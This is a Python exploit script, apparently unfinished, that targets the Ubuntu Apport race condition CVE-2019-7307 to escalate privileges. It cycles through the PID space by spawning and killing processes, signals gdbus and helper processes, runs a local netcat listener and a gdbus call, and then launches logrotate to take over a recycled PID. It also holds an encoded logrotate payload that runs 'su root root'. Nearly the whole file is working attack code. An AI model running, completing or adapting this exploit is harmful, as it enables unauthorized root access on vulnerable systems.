#!/usr/bin/python3 -tt

__version__ = 0.6

import os, signal, subprocess
import base64, zlib
import math, time
import logging

logging.basicConfig(level=logging.DEBUG, filename='crash.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s')
logging.debug("Logging started")

def main():
    """
    main script to launch the stuff
    """

    global target_pid
    
    print("[+] Starting...")
    #serverCall()
    #gdbusCall()
    #processB()
    #gdbus_sigsegv()
    #processB()
    target_pid = pidof("sleep")
    fork_child_with_pid()
    #clean_up()


def gdbusCall():
    """
    call gdbus utility to initiate the lock on apport
    we need a non-blocking call, need to resort to Popen
    """

    print("Listen start")

    # DBUS_SESSION_BUS_ADDRESS='tcp:host=127.0.0.1,port=8888' gdbus call -e
    # -d org.gnome.SessionManager
    try:
        #subprocess.check_call(["gdbus", "call", "-e", "-d", "org.gnome.SessionManager"], env={"DBUS_SESSION_BUS_ADDRESS":"'tcp:host=127.0.0.1,port=8080'"})
        #subprocess.check_call(["gdbus", "call", "-e", "-d", "org.gnome.SessionManager"], env={"DBUS_SESSION_BUS_ADDRESS":"tcp:host=127.0.0.1,port=8080"})
        subprocess.Popen(["gdbus", "call", "-e", "-d", "org.gnome.SessionManager"], env={"DBUS_SESSION_BUS_ADDRESS":"tcp:host=127.0.0.1,port=8888"})
    except Exception as e:
        print(e)
        
def serverCall():
    """
    call a nc server on port 8080
    """

    print("Server launched on 127.0.0.1:8888")

    #subprocess.check_call(["nc", "-lvv", "127.0.0.1", "-p", "8080"])
    subprocess.Popen(["nc", "-lvv", "127.0.0.1", "-p", "8888"])
    #subprocess.check_call(["python3", "-m", "http.server", "8888"])

def processB():
    """
    """

    try:
        subprocess.Popen(["sleep", "1000"])
        print("Running processB in bg")
    except Exception as e:
        print(e)

target_pid = -1

def pidof(tgt_proc="sleep"):
    """
    getting the pid of gdbus
    returns nothing, sets the
    global variable target_pid
    """
    
    #global target_pid

    try:
        pid = subprocess.check_output(["pidof","-s", tgt_proc]).strip().decode()
        #print(pid)
        #target_pid = int(pid)
        return int(pid)
    except Exception as e:
        print(e)


def gdbus_sigsegv():
    """
    """
    
    try:
        #pid = subprocess.check_output(["pidof", "-s", "gdbus"]).strip().decode()
        #pid = int(pid)

        os.kill(pidof("gdbus"), signal.SIGSEGV)
    except Exception as e:
        print(e)


def fork_child_with_pid():
    """
    to run a specific process(with privs) we spawn/overflow the PID space
    by running a number of /bin/sleep instances ; which are killed just after
    when we approach the target pid we send a SIGKILL to the "process B"
    which is the process that was spawned by sending a SIGSEGV to gdbus
    https://github.com/github/security-lab/blob/8a4842917730357bf43d3148fb4fb0b3a7d5b9d6/SecurityExploits/Ubuntu/Apport_TOCTOU_get_ignore_dom_CVE-2019-7307/utils.cpp#L281
    """

    global target_pid

    # retrieve pid_max value
    pid_max = subprocess.check_output(["cat", "/proc/sys/kernel/pid_max"]).strip().decode()
    print("pid_max: {}".format(pid_max))

    try:
        #target_pid = pidof("sleep")
        logging.debug("Target pid: {}".format(target_pid))
        
        if target_pid == -1:
            #print("[-] gdbus not running")
            print("[-] target process/sleep not running")

            return 42
        
        print("[+] Looking for PID: {}".format(target_pid))

        target_pid_sigsegv_time = math.floor(target_pid/2)
        #target_pid_sigsegv_time = math.floor(target_pid/3)

        # run a number of time equal to pid_max
        for el in range(int(pid_max)):

            #tmp_proc = subprocess.Popen(["sleep", "60"])
            tmp_proc = subprocess.Popen(["watch", "-n60", "pwd"])
            tmp_proc_pid = tmp_proc.pid

            if tmp_proc_pid == target_pid_sigsegv_time:
                print("[+] SIGSEGV on processB.")
                os.kill(target_pid, signal.SIGSEGV)
            
            # exec logrotate with target_pid
            #if tmp_proc_pid == target_pid-4: #sigkill
            if tmp_proc_pid+1 == target_pid-4:
                #print("[+] SIGSEGV on processB.")
                #os.kill(target_pid, signal.SIGSEGV)

                # kill target PID, so that we can take it
                # target_pid <==> processB
                os.kill(target_pid, signal.SIGKILL)
                #os.kill(target_pid, signal.SIGQUIT)
                #os.kill(target_pid, signal.SIGSYS)
                logging.debug(time.perf_counter())

                # launching a priv proc
                #p = subprocess.Popen(["logrotate", "-f", "/etc/logrotate.d/"])

                print("[+] Tmp PID: {}".format(tmp_proc_pid))
                print("[+] Target PID: {}".format(target_pid))
                
                # terminating process A by sending sigterm to the tcp server
                #p2 = subprocess.Popen(["pidof", "nc"])
                p2 = subprocess.check_output(["pidof", "nc"]).strip().decode()
                p2 = int(p2)
                os.kill(p2, signal.SIGTERM)

                p = subprocess.Popen(["logrotate", "-f", "/etc/logrotate.d/"])
                logging.debug(time.perf_counter())
                #print("[+] Reached target PID: {}! Spawning privileged process..".format(p.pid))
                logging.debug("[+] Reached target PID: {}! Spawning privileged process..".format(p.pid))

                break
            else:
                # tmp_proc_pid != target_pid
                # we don't need other procs
                print("[+] Target PID is: {}".format(target_pid))
                print("[-] Killing PID {}".format(tmp_proc_pid))

                os.kill(tmp_proc.pid, signal.SIGKILL)

    except Exception as e:
        print(e)


def clean_up():
    """
    """
    try:
        if pidof("sleep"):
            os.kill(pidof("sleep"), signal.SIGKILL)
        if pidof("nc"):
            os.kill(pidof("nc"), signal.SIGKILL)
        pass
    except Exception as e:
        print(e)


def gen_payload():
    """
    https://www.exploit-db.com/exploits/37088
    => Not in use for the moment
    """
    try:
        c = zlib.compressobj(9,zlib.DEFLATED,-zlib.MAX_WBITS)
        p = b"char payload[] = \"\\n/tmp/pwn.log{\\n    su root root\\n    daily\\n    size=0\\n    firstaction\\n        > /tmp/exploited;\\n    endscript\\n}\\n\";"
        c.compress(p)
        a = c.flush()
        
        return base64.b64encode(a)
    
    except Exception as e:
        print(e)
    

if __name__ == "__main__":
    main()
